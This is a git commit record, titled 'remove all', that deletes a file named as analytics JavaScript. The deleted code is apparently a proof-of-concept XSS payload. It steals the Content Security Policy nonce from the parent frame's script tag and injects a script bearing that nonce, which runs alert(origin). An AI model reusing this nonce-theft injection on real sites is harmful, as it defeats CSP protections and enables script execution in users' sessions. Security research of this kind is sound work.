5bd1bc95c794e8351a0bac5d872dcffc41eb5f0f
Yaswant <52544332+Az3z3l@users.noreply.github.com>
2021-07-02 11:23:56 +0530

    remove all

--- files/analytics/js/frame-analytics.js
+++
@@ -1,8 +0,0 @@
-setTimeout(() => {
-  var nonce = window.parent.document.getElementsByTagName("script")[0].nonce;
-  console.log(nonce);
-  var x = window.parent.document.createElement("script");
-  x.setAttribute("nonce", nonce);
-  x.innerHTML="alert(origin)";
-  window.parent.document.body.appendChild(x);
-}, 5000);
